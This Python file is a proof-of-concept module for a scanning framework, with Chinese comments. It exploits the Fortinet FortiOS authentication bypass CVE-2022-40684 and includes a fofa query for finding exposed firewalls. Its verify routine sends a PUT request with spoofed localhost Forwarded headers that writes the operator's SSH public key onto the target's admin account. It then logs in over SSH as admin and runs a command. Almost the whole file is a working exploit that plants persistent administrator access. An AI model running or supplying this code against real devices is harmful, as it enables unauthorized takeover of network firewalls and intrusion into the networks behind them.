# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import paramiko
import os

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
            这个POC会读取当前用户的ssh_key公钥，然后发payload。
            请注意，如果你的机器做过github、gitlab、gitee等平台的多账户共存，可能没有id_rsa.pub文件，则oFx会直接跳过该POC，望周知。
        """,  # POC描述，写更新描述，没有就不写

        "name": "飞塔(Fortinet)防火墙身份认证绕过漏洞(CVE-2022-40684)",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "飞塔(Fortinet)防火墙",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。
            该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。
            
            近日，Fortinet官方发布安全公告，修复了其多个产品中的一个身份验证绕过漏洞（CVE-2022-40684），其CVSSv3评分为9.8。
            该漏洞可能允许攻击者在易受攻击的设备上执行未经授权的操作，攻击者通过向易受攻击的目标发送特制的 HTTP 或 HTTPS 请求进行绕过身份认证以管理员身份在控制面板中执行任意操作。
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="FORTINET-防火墙"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        if os.path.exists(f'{os.path.expanduser("~")}/.ssh/id_rsa.pub'):
            with open(f'{os.path.expanduser("~")}/.ssh/id_rsa.pub', "r") as f:
                ssh_key = f.read().strip()
        else:
            return vuln
        url = self.target + "/api/v2/cmdb/system/admin/admin"  # url自己按需调整

        data = """
{
"ssh-public-key1": "\\"%s\\""
}
""" % ssh_key
        headers = {
            "User-Agent": "Report Runner",
            "Connection": "close",
            "Forwarded": "for=127.0.0.1; by=127.0.0.1;",
            "Content-Type": "application/json",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.put(url, data=data, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if req.status_code == 500 and "vdom" in req.text and "application/json" in req.headers["Content-Type"]:
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    self.host,
                    port=22,
                    username="admin",
                    password=None,
                    banner_timeout=200,
                )
                stdin, stdout, stderr = ssh.exec_command("execute date")
                nl_char = "\n"
                output = str(stdout.read().decode().replace(nl_char, " "))
                ssh.close()

                if "current date is" in output:
                    vuln = [True, output]
            else:
                vuln = [False, req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
